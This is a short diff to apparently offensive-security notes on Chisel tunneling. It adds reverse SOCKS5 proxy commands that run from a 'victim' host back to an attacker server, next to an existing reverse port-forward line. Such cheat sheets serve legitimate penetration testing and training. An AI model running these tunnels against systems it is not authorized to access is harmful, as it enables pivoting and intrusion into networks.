@@ -43,3 +43,18 @@ Move chisel binary to victim.
 ```bash
 ./chisel client <attack_ip>:9999 R:8080:127.0.0.1:1337
 ```
+
+# socks5 proxy
+
+setup foxyproxy socks5 on localhost 1080
+
+```bash
+./chisel client server:9999 R:socks
+```
+
+socks5 proxy at attacker on port 1234
+
+```bash
+./chisel client server:9999 R:1234:socks
+```
+
